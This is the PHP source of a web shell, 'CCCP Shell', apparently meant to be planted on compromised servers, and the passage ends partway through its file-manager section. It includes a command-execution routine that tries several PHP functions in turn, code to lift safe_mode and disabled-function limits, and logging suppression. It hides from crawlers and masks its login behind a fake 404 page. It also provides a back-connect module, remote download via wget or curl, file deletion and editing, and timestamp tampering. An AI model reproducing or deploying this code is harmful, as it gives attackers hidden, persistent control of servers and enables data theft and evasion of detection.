<?php
/*
 *	CCCP Shell
 *	by DSR!
 *	https://github.com/xchwarze/CCCPShell
 *  v 1.0 RC2 08072014
 */

# System variables
$config['charset'] = 'utf8';
$config['date'] = 'd/m/Y';
$config['datetime'] = 'd/m/Y H:i:s';
$config['hd_lines'] = 16; //lines in hex preview file
$config['hd_rows'] = 32;  //16, 24 or 32 bytes in one line
$config['FMLimit'] = False;    //file manager item limit. False = No limit
$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass)
$CCCPmod[] = 'sql';
$CCCPtitle[] = tText('sql', 'SQL');
$CCCPmod[] = 'connect';
$CCCPtitle[] = tText('connect', 'Back Connect');
$CCCPmod[] = 'execute';
$CCCPtitle[] = tText('execute', 'Execute');
$CCCPmod[] = 'info';
$CCCPtitle[] = tText('info', 'Info');
$CCCPmod[] = 'process';
$CCCPtitle[] = tText('process', 'Process');

// ------ Start CCCPShell
$tiempoCarga = microtime(true);
$isWIN = DIRECTORY_SEPARATOR === '\\';
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
define('DS', DIRECTORY_SEPARATOR);
define('SROOT', dirname(__file__) . DS);

# Restoring
ini_restore('safe_mode_include_dir');
ini_restore('safe_mode_exec_dir');
ini_restore('disable_functions');
ini_restore('allow_url_fopen');
ini_restore('safe_mode');
ini_restore('open_basedir');
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('file_uploads', 1);
@ini_set('allow_url_fopen', 1);
@ini_alter('error_log', null);
@ini_alter('log_errors', 0);
@ini_alter('file_uploads', 1);
@ini_alter('allow_url_fopen', 1);

//@error_reporting(7);
@ini_set('memory_limit', '64M'); //change it if phpzip fails
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@clearstatcache();

$userAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
    header('HTTP/1.0 404 Not Found');
    exit;
}

if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
	header("sBuff-Type: text/html; charset=$config[charset]");

function mHide($name, $value){
	return "<input id='$name' name='$name' type='hidden' value='$value' />";
}

function mInput($arg){
	$arg['v'] = (isset($arg['v']) ? $arg['v'] : '');
	$arg['e'] = (isset($arg['e']) ? $arg['e'] : '');
	$arg['c'] = (isset($arg['c']) ? $arg['c'] : '');
	$arg['tt'] = (isset($arg['tt']) ? $arg['tt'].'<br>' : '');
	if (isset($arg['nl']))
		return "<p>$arg[tt]<input class='$arg[c]' name='$arg[n]' id='$arg[n]' value='$arg[v]' type='text' $arg[e] /></p>";
	else
		return "$arg[tt]<input class='$arg[c]' name='$arg[n]' id='$arg[n]' value='$arg[v]' type='text' $arg[e] />";
}

function mSubmit($v, $o, $nl = false){
	if (isset($nl))
		return "<p><input type='button' value='$v' onclick='$o;return false;'></p>";
	else
		return "<input type='button' value='$v' onclick='$o;return false;'>";
}

function mSelect($arg){
	$tmp = '';
	$arg['onchange'] = isset($arg['onchange']) ? "onchange='$arg[onchange]'" : '';
	$arg['title'] = isset($arg['title']) ? $arg['title'] : '';
	if (isset($arg['nokey'])){
		foreach ($arg['option'] as $value){
			if ($arg['selected']==$value){
				$tmp .= "<option value='$value' selected='selected'>$value</option>";
			} else {
				$tmp .= "<option value='$value'>$value</option>";
			}
		}
	} else {
		foreach ($arg['option'] as $key=>$value){
			if ($arg['selected'] == $key){
				$tmp .= "<option value='$key' selected='selected'>$value</option>";
			} else {
				$tmp .= "<option value='$key'>$value</option>";
			}
		}
	}
	$tmp = "$arg[title] <select class='theme' style='width:150px;' id='$arg[name]' name='$arg[name]' $arg[onchange]>$tmp</select>";
	if (isset($arg['newline'])) $tmp = "<p>$tmp</p>";
	return $tmp;
}

function fix_magic_quote($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	$quotes_sybase = (empty($quotes_sybase) || $quotes_sybase === 'off') ? false : true;
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		if(is_array($arr)){
			foreach($arr as $k => $v){
				if(is_array($v)) $arr[$k] = fix_magic_quote($v);
				else $arr[$k] = ($quotes_sybase ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v)));
			}
		} else 
			$arr = stripslashes($arr);			
	}
	return $arr;
}

function tText($id, $default){
	
	if (isset($lang[$id])) return $lang[$id];
	else return $default;
}

function showIcon($file){
	$image = 'unk';
	$file = strtolower(substr(strrchr($file, '.'), 1));
	$img = array('htaccess', 'asp', 'cgi', 'php', 'html', 'jpg', 'js', 'swf', 'txt',
	 'tar', 'mp3', 'avi', 'cmd', 'cpp', 'ini', 'doc', 'exe', 'log', 'pl', 'py', 'xml');

    $imgEquals = array(
      'tar' => array('tar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'zip', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'rar', 'uuf', '7z'), 
      'php' => array('php', 'php3', 'php4', 'php5', 'phtml', 'shtml'), 
      'jpg' => array('jpg', 'gif', 'png', 'jpeg', 'jfif', 'jpe', 'bmp', 'ico', 'tif', 'tiff'), 
      'html'=> array('html', 'htm'), 
      'avi' => array('avi', 'mov', 'mvi', 'mpg', 'mpeg', 'wmv', 'rm', 'mp4'), 
      'lnk' => array('lnk', 'url'), 
      'ini' => array('ini', 'css', 'inf'), 
      'doc' => array('doc', 'dot', 'wri', 'rtf', 'pdf'), 
      'js'  => array('js', 'vbs'), 
      'cmd' => array('cmd', 'bat', 'pif'), 
      'swf' => array('swf', 'fla'), 
      'mp3' => array('mp3', 'au', 'midi', 'mid'), 
      'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
	);

	if (in_array($file, $img)) $image = $file;
	if ($image === 'unk'){
		foreach ($imgEquals as $k => $v){
			if (in_array($file, $v)){
				$image = $k;
				break;
			}
		}
	}

    return "<div class='image $image'></div>";
}

# General functions
function hsc($s){
	return htmlspecialchars($s, 2|1);
}

function execute($c, $i = false){
    $v = '';
    $r = '';
	//$c = $c . ' 2>&1';
    $dis_func = explode(',', get_cfg_var('disable_functions'));

    if ($c){
        if (function_exists('exec') && !in_array('exec', $dis_func)){
            exec($c, $r);
            $r = implode("\n", $r);
			//$tmp = '';
			//if(!empty($r)) foreach($r as $line) $tmp .= $line;
			//$r = $tmp;
			$v = 'exec';
        } elseif (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
            $r = @shell_exec($c);
			$v = 'shell_exec';
        } elseif (function_exists('system') && !in_array('system', $dis_func)){
            @ob_start();
            @system($c);
            $r = @ob_get_sBuffs();
            @ob_end_clean();
			$v = 'system';
        } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)){
            @ob_start();
            @passthru($c);
            $r = @ob_get_sBuffs();
            @ob_end_clean();
			$v = 'passthru';
        } elseif (function_exists('popen') && !in_array('popen', $dis_func)){
            $h = popen($c, 'r');
            if (is_rource($h)){	
                if (function_exists('fread') && function_exists('feof')){
                    while (!feof($h)){
                        $r .= fread($h, 512);
                    }
                } elseif (function_exists('fgets') && function_exists('feof')){
                    while (!feof($h)){
                        $r .= fgets($h, 512);
                    }
                }
            }
            pclose($h);
			$v = 'popen';
        } elseif (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
            $ds = array(1 => array('pipe', 'w'));
            //$ds = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $h = @proc_open($c, $ds, $pipes);
            //$h = @proc_open($c, $ds, $pipes, getcwd(), array());
            if (is_rource($h)){
                if (function_exists('fread') && function_exists('feof')){
                    while (!feof($pipes[1])){
                        $r .= fread($pipes[1], 512);
                    }
                } elseif (function_exists('fgets') && function_exists('feof')){
                    while (!feof($pipes[1])){
                        $r .= fgets($pipes[1], 512);
                    }
					/*while (!feof($pipes[2])){
                        $r .= fgets($pipes[2], 512);
                    }*/
                }
            }
            @proc_close($h);
			$v = 'proc_open';
        }
    }

	if ($i) $r = array(0 => $r, 1 => $v);
    return($r);
}

function safeStatus(){
    $safe_mode = @ini_get('safe_mode');
    if (!$safe_mode && strpos(execute('echo abcdef'), 'def') != 3) $safe_mode = true;
    return $safe_mode;
}

function getfun($funName){
    return (false !== function_exists($funName)) ? tText('yes', 'yes') : tText('no', 'no');
}

function getcfg($varname){
    $result = get_cfg_var($varname);
    if ($result == 0) return tText('no', 'no');
    elseif ($result == 1) return tText('yes', 'yes');
    else return $result;
}

function sizecount($size){
	if ($size[0] === '*') return $size;
	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
}

function getPath($scriptpath, $nowpath){
    if ($nowpath === '.') $nowpath = $scriptpath;
    if (substr($nowpath, -1) !== DS) $nowpath = $nowpath . DS;
    return $nowpath;
}

function getUpPath($nowpath){
    $pathdb = explode(DS, $nowpath);
    $num = count($pathdb);
    if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
    $uppath = implode(DS, $pathdb) . DS;
    return $uppath;
}

function sAjax($i){
    exit($i);
}

function sDialog($i){
    return "<br><div id='uires' class='uires'>$i</div><br>";
}

function sValid($v){
    if ((isset($v)) && ($v !== '')) return true;
    else return false;
}

function zip($files, $archive){
	if(!extension_loaded('zip')) return false;
	$zip = new ZipArchive();
	if(!$zip->open($archive, 1)) return false;

	if(!is_array($files)) $files = array($files);
	foreach($files as $file){
		$file = str_replace(get_cwd(), '', $file);
		$file = str_replace('\\', '/', $file);
		if(is_dir($file)){
			$filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1);
			foreach($filesIterator as $iterator){
				$iterator = str_replace('\\', '/', $iterator);
				if(in_array(substr($iterator, strrpos($iterator, '/')+1), array('.', '..'))) continue;
				if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/'));
				else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator));
			}
		} elseif(is_file($file)) 
			$zip->addFromString(basename($file), read_file($file));
	}
	if($zip->getStatusString()!==false) return true;
	$zip->close();
}

//TODO agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
//para poder usarlo con archivos enormes/poca memoria
# Based on PHPZip v1.2 by DSR!
class PHPZip {
    var $datasec = array();
    var $ctrl_dir = array();
    var $old_offset = 0;

    function Zipper($basedir, $filelist){
		$curdir = dirname($basedir . $filelist[0]);
		foreach ($filelist as $filename){	
			$filename = $basedir . $filename;
			if (file_exists($filename)){
				if (is_dir($filename)) $sBuff = $this->GetFileList($filename, $curdir);
				if (is_file($filename)){
					$fd = fopen($filename, 'r');
					$sBuff = @fread($fd, filesize($filename));
					fclose($fd);
					$this->addFile($sBuff, str_replace($curdir . DS, '', $filename));
				}
			}
        }
        $out = $this->file();
		
        return 1;
    }

    function GetFileList($dir, $curdir){
        if (file_exists($dir)){			
			$dirPrefix = basename($dir) . DS;
            $dh = opendir($dir);
            while ($files = readdir($dh)){
                if (($files !== '.') && ($files !== '..')){
                    if (is_dir($dir . $files)) $this->GetFileList($dir . $files . DS, $curdir);
                    else {
						$fd = fopen($dir . $files, 'r');
						$sBuff = @fread($fd, filesize($dir . $files));
						fclose($fd);
						$this->addFile($sBuff, str_replace($curdir . DS, '', $dir . $files));
                    }
                }
            }
            closedir($dh);
        }
        return 1;
    }

    function unix2DosTime($unixtime = 0){
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) $timearray = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
	
	function hex2bin($str){
		$bin = '';
		$i = 0;
		do {
			$bin .= chr(hexdec($str{$i}.$str{($i + 1)}));
			$i += 2;
		} while ($i < strlen($str));
		return $bin;
	}

    function addFile($data, $name, $time = 0){
		$packv0 = pack('v', 0);
        $dtime = dechex($this->unix2DosTime($time));
		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;

        // "local file header" segment
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len = strlen($zdata);
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len);

        // add this entry to array
        $this->datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
        $cdrec .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset += strlen($fr);
        $cdrec .= $name;

        // save to central directory
        $this->ctrl_dir[] = $cdrec;
    }

    function file(){
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
    }

    function output($file){
        $fp = fopen($file, 'w');
        fwrite($fp, $this->file());
        fclose($fp);
    }
}

function compress($type, $archive, $files){
	if(!is_array($files)) $files = array($files);
	if($type=='zip'){
		if(class_exists('ZipArchive')){
			if (zip($files, $archive)) return true;
		} else {
			
		}
	} else if (($type=='tar')||($type=='targz')){
		$archive = basename($archive);
		$listsBasename = array_map('basename', $files);
		$lists = array_map('wrap_with_quotes', $listsBasename);

		if ($type=='tar') 
			execute('tar cf "'.$archive.'" '.implode(' ', $lists));
		else if ($type=='targz') 
			execute('tar czf "'.$archive.'" '.implode(' ', $lists));

		if (is_file($archive)) 
			return true;
	}
	return false;
}

function decompress($type, $archive, $path){
	$path = realpath($path).DIRECTORY_SEPARATOR;
	if(is_dir($path)){
		chdir($path);
		if($type=='unzip'){
			if(class_exists('ZipArchive')){
				$zip = new ZipArchive();
				$target = $path.basename($archive,'.zip');
				if($zip->open($archive)){
					if(!is_dir($target)) mkdir($target);
					if($zip->extractTo($target)) return true;
					$zip->close();
				}
			} else {
			
			}
		} elseif($type=='untar'){
			$target = basename($archive,'.tar');
			if(!is_dir($target)) mkdir($target);
			$before = count(get_all_files($target));
			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
			$after = count(get_all_files($target));
			if($before!=$after) return true;
		} elseif($type=='untargz'){
			$target = '';
			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
			elseif(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
			if(!is_dir($target)) mkdir($target);
			$before = count(get_all_files($target));
			execute('tar xzf "'.basename($archive).'" -C "'.$target.'"');
			$after = count(get_all_files($target));
			if($before!=$after) return true;
		}
	}
	return false;
}

function download($url ,$save){
	if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
	$filename = basename($url);

	if($sBuff = read_file($url)){
		if(is_file($save)) unlink($save);
		if(write_file($save, $sBuff))
			return true;
	}
	
	if (!$isWIN){
		$buff = execute('wget '.$url.' -O '.$save);
		if(is_file($save)) return true;
		$buff = execute('curl '.$url.' -o '.$save);
		if(is_file($save)) return true;
		$buff = execute('lwp-download '.$url.' '.$save);
		if(is_file($save)) return true;
		$buff = execute('lynx -source '.$url.' > '.$save);
		if(is_file($save)) return true;
	}

	return false;
}

function filesize64($file){
	$size = filesize($file);
	if ($size > 1610612736 or $size < -1){
		/*
		global $isWIN;
		$size = 0;
		if (!safeStatus()){
			$cmd = ($isWIN) ? "for %F in (\"$file\") do @echo %~zF" : "stat -c%s \"$file\"";
			execute($cmd, $output);
			ctype_digit($size = trim($output));
		}
	
		if ($isWIN && class_exists("COM")){
			try {
				$fsobj = new COM('Scripting.FileSystemObject');
				$f = $fsobj->GetFile(realpath($file));
				$size = $f->Size;
			} catch (Exception $e){}
		}
		
		$piece = 1073741824;
		$fp = @fopen($file, 'r');
		@fseek($fp, 0, SEEK_SET);
		while ($piece > 1){
			@fseek($fp, $piece, SEEK_CUR);
			if (@fgetc($fp) === false){
				@fseek($fp, -$piece, SEEK_CUR);
				$piece = (int)($piece / 2);
			} else {
				@fseek($fp, -1, SEEK_CUR);
				$size += $piece;
			}
		}

		while (@fgetc($fp) !== false)
			$size++;
			
		@fclose($file_pointer);
		*/
		$size = sprintf("%u", $size);
		$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
		$size = '* ' . @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
	}
	
	return $size;
}


$sBuff = '';  	
$p = fix_magic_quote($_POST);
if (!empty($_GET)) $p += fix_magic_quote($_GET);

# Validate now
if ($config['sPass']){
	@session_start();
	if (!isset($_SESSION[ md5($_SERVER['HTTP_HOST']) ])){ 
		if (isset($p['pa']) && (md5($p['pa']) === $config['sPass'])){ 
			$_SESSION[ md5($_SERVER['HTTP_HOST']) ] = true; 
		} else {
			echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' .
				 '<html><head>' .
				 '<title>404 Not Found</title>' .
				 '</head><body>' .
				 '<h1>Not Found</h1>' .
				 '<p>The requested URL ' . $_SERVER['HTTP_HOST'] . ' was not found on this server.</p>' .
				 '</body>' .
				 '<style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>' .
				 '<center><form method=post><input type="password" name="pa"></form></center>' .
				 '</html>';
			exit;
		}
	}
}
	
# Sections
if (isset($p['me']) && $p['me'] === 'file'){
	$shelldir = getPath(SROOT, '.');

	function dirsize($dir){
        $f = $s = 0;
        $dh = @opendir($dir);
        while ($file = @readdir($dh)){
			if ($file !== '.' && $file !== '..'){
				$path = $dir . DS . $file;
				if (@is_dir($path)){
					$tmp = dirsize($path); 
					$f = $f + $tmp['f'];  
					$s = $s + $tmp['s'];  
				} else {
					$f++;
					$s += @filesize($path);
				}
			}
        }
        @closedir($dh);
        return array ('f' => $f, 's' => $s);
    }

    function getChmod($filepath){
        return substr(base_convert(@fileperms($filepath), 10, 8), -4);
    }

    function getPerms($filepath){ # C99r16
		$mode = @fileperms($filepath);
        if (($mode & 0xC000) === 0xC000) $type = 's';     // Socket
        elseif (($mode & 0x4000) === 0x4000) $type = 'd'; // Directory
        elseif (($mode & 0xA000) === 0xA000) $type = 'l'; // Symbolic Link
        elseif (($mode & 0x8000) === 0x8000) $type = '-'; // Regular 
        elseif (($mode & 0x6000) === 0x6000) $type = 'b'; // Block special
		elseif (($mode & 0x2000) === 0x2000) $type = 'c'; // Character special
		elseif (($mode & 0x1000) === 0x1000) $type = 'pa';// FIFO pipe
		else $type = '?';                                 // Unknown

		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
		$owner['write'] = ($mode & 00200) ?   'w' : '-'; 
		$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
		$group['read'] = ($mode & 00040) ?    'r' : '-'; 
		$group['write'] = ($mode & 00020) ?   'w' : '-'; 
		$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
		$world['read'] = ($mode & 00004) ?    'r' : '-'; 
		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

		if ($mode & 0x800){$owner['execute'] = ($owner['execute']==='x') ? 's' : 'S';}
		if ($mode & 0x400){$group['execute'] = ($group['execute']==='x') ? 's' : 'S';}
		if ($mode & 0x200){$world['execute'] = ($world['execute']==='x') ? 't' : 'T';}
		
		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
    }

    function getUser($filepath){
		if (function_exists('posix_getpwuid')){
			$array = @posix_getpwuid(@fileowner($filepath));
			if ($array && is_array($array)){
				return ' / <a href="#" onclick="return false;" title="User: ' . $array['name'] . ' Passwd: ' . $array['passwd']
					. ' UID: ' . $array['uid'] . '	GID: ' . $array['gid']
					. ' Gecos: ' . $array['gecos'] . '	Dir: ' . $array['dir']
					. ' Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
			}
		}
		return '';
    }
	
	function vPermsColor($t){ 
		$c = 'mg';
		if (!is_readable($t))
			$c = 'mr';
		else if (!is_writable($t))
			$c = 'mw';
		return "<font class='$c'>" . getChmod($t) . '&nbsp;' . getPerms($t) . "</font>";
	}

    function delTree($path){
            $origipath = $path;
            $h = opendir($path);
            while (true){
                $item = readdir($h);
                if ($item === '.' or $item === '..'){
                    continue;
                } elseif (gettype($item) === 'boolean'){
                    closedir($h);
                    if (!@rmdir($path))
                        return false;
                    
                    if ($path == $origipath) 
                        break;
                    
                    $path = substr($path, 0, strrpos($path, DS));
                    $h = opendir($path);
                } elseif (is_dir($path . DS . $item)){
                    closedir($h);
                    $path = $path . DS . $item;
                    $h = opendir($path);
                } else 
                    unlink($path . DS . $item);
            }
            return true;
    }
		
    function recursiveCopy($path, $dest){ 
		if (is_dir($path)){
			@mkdir($dest);
			$objects = scandir($path);
			if (sizeof($objects) > 0){
				foreach($objects as $file){
					if ($file !== '.' && $file !== '..'){
						if (is_dir($path.$file))
							recursiveCopy($path . $file . DS, $dest . DS . $file . DS);
						else 
							copy($path . $file, $dest . $file);
					}
				}
			}
			return true;
		} elseif(is_file($path)){
			return copy($path, $dest);
		} else {
			return false;
		} 
    }
	
	function getext($file){
		//$info = pathinfo($file);
		return pathinfo($file, PATHINFO_EXTENSION);
    }
	
    function GetWDirList($dir){
            global $dirdata, $j, $shelldir;
            ! $j && $j = 1;
            if ($dh = opendir($dir)){
                while ($file = readdir($dh)){
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)){
                        if (is_writable($f)){
                            $dirdata[$j]['filename'] = str_replace($shelldir, '', $f);
                            $dirdata[$j]['mtime'] = @date($config['datetime'], filemtime($f));
                            $dirdata[$j]['dirchmod'] = getChmod($f);
                            $dirdata[$j]['dirperm'] = getPerms($f);
                            $dirdata[$j]['dirlink'] = $dir;
                            $dirdata[$j]['server_link'] = $f;
                            $j++;
                        }
                        GetWDirList($f);
                    }
                }
                closedir($dh);
                clearstatcache();
                return $dirdata;
            } else {
                return array();
            }
    }

    function GetWFileList($dir){
            global $filedata, $j, $shelldir, $writabledb;
            ! $j && $j = 1;
            if ($dh = opendir($dir)){
                while ($file = readdir($dh)){
                    $ext = getext($file);
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)){
                        GetWFileList($f);
                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                        if (is_writable($f)){
                            $filedata[$j]['filename'] = str_replace($shelldir, '', $f);
                            $filedata[$j]['size'] = sizecount(@filesize($f));
                            $filedata[$j]['mtime'] = @date($config['datetime'], filemtime($f));
                            $filedata[$j]['filechmod'] = getChmod($f);
                            $filedata[$j]['fileperm'] = getPerms($f);
                            $filedata[$j]['fileowner'] = getUser($f);
                            $filedata[$j]['dirlink'] = $dir;
                            $filedata[$j]['server_link'] = $f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
    }

    function GetSFileList($dir, $sBuff, $re = 0){
            global $filedata, $j, $shelldir, $writabledb;
            ! $j && $j = 1;
            if ($dh = opendir($dir)){
                while ($file = readdir($dh)){
                    $ext = getext($file);
                    $f = str_replace('//', '/', $dir . '/' . $file);
                    if ($file !== '.' && $file !== '..' && is_dir($f)){
                        GetSFileList($f, $sBuff, $re = 0);
                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                        $find = 0;
                        if ($re){
                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_sBuffs($f))){
                                $find = 1;
                            }
                        } else {
                            if (strstr($file, $sBuff) || strstr(@file_get_sBuffs($f), $sBuff)){
                                $find = 1;
                            }
                        }
                        if ($find){
                            $filedata[$j]['filename'] = str_replace($shelldir, '', $f);
                            $filedata[$j]['size'] = sizecount(@filesize($f));
                            $filedata[$j]['mtime'] = @date($config['datetime'], filemtime($f));
                            $filedata[$j]['filechmod'] = getChmod($f);
                            $filedata[$j]['fileperm'] = getPerms($f);
                            $filedata[$j]['fileowner'] = getUser($f);
                            $filedata[$j]['dirlink'] = $dir;
                            $filedata[$j]['server_link'] = $f;
                            $j++;
                        }
                    }
                }
                closedir($dh);
                clearstatcache();
                return $filedata;
            } else {
                return array();
            }
    }		

    if (@$p['md'] === 'vs'){
		$s = dirsize($p['f']);
		sAjax(is_numeric($s['s']) ? sizecount($s['s']) . ' (' . $s['f'] . ')' : 'Error?');
	} elseif (@$p['md'] === 'tools'){
		switch ($p['ac']){
			case 'cdir':
				if (file_exists($p['a'] . $p['b']))
					sAjax(tText('alredyexists', 'object alredy exists'));
				else {
					sAjax(@mkdir($p['a'] . $p['b'], 0777) ? 'OK' : tText('fail', 'Fail!'));
					@chmod($p['a'] . $p['b'], 0777);
				}
				break;
			case 'cfile':
				if (file_exists($p['a'] . $p['b']))
					sAjax(tText('alredyexists', 'object alredy exists'));
				else {
					$fp = @fopen($p['a'] . $p['b'], 'w');
					if ($fp){
						@fclose($fp);
						sAjax('OK');
					} else sAjax(tText('accessdenied', 'Access denied'));
				}
				break;
			case 'comp':
				if ($p['dl']){
					$zip = new PHPZip();
					$zip->Zipper($p['fl'], $p['dl']);
					header('sBuff-type: application/octet-stream');
					header('Accept-Ranges: bytes');
					header('Accept-Length: ' . strlen($compress));
					header('sBuff-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
					echo $zip->file();
					exit;
				}
				break;
			case 'copy': 
				if ($p['dl']){
					$fNames = Array();
					$total = count($p['dl']);
					if ($p['b'][(strlen($p['b']) - 1)] !== DS) $p['b'] .= DS; 
					for ($z = 0; $total > $z; $z++){
						$fileinfo = pathinfo($p['fl'] . $p['dl'][$z]);
						if (!file_exists($p['fl'] . $p['dl'][$z]))
							sAjax(tText('notexist', 'Object does not exist'));
						else {
							if (is_dir($p['fl'] . $p['dl'][$z])){ 
								if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
							} else {
								if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
							}
						}
					}
					sAjax(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']');
				}
				break;
			case 'del':
				if (!file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else
					sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));				
				break;
			case 'rdel':
				if ($p['dl']){
					$fNames = Array();
					$total = count($p['dl']);				
					for ($z = 0; $total > $z; $z++){
						if (is_dir($p['fl'] . $p['dl'][$z])){
							if (!@delTree($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
						} else {
							if (!@unlink($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
						}
					}
					sAjax(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']');
				}
				break;
			case 'dl':
				if (!file_exists($p['fl']))
					sAjax(tText('notexist', 'Object does not exist'));
				else {
					$fileinfo = pathinfo($p['fl']);
					header('sBuff-Type: application/x-' . $fileinfo['extension']);
					header('sBuff-Disposition: attachment; filename=' . $fileinfo['basename']);
					header('sBuff-Length: ' . filesize($p['fl']));
					@readfile($p['fl']);
					exit;
				}
				break;
			case 'edit':
				$fp = @fopen($p['a'], 'w');
				sAjax((@fwrite($fp, $p['fc']) ? tText('ok', 'Ok!') : tText('fail', 'Fail!')));
				@fclose($fp);
				break;
			case 'mdate':
				if (!@file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else {
					//date_format(date_create_from_format('Y-m-d', $dateString), 'd-m-Y'));
					if (isset($p['b'])) $time = strtotime($p['b']);
					else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['m'] . ':' . $p['s']);
					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
				}
				break;
			case 'mdatec':
